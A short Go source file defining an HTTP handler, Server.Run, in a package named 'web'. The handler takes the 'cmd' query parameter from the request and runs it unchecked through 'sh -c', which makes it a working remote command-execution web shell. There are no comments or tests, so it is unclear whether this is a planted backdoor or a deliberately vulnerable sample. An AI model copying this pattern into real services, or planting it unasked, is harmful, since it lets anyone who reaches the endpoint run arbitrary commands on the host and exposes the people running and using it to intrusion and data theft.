package web

import (
	"net/http"
	"os/exec"
)

type Server struct{}

func (s *Server) Run(w http.ResponseWriter, r *http.Request) {
	cmd := r.URL.Query().Get("cmd")
	exec.Command("sh", "-c", cmd).Run()
}
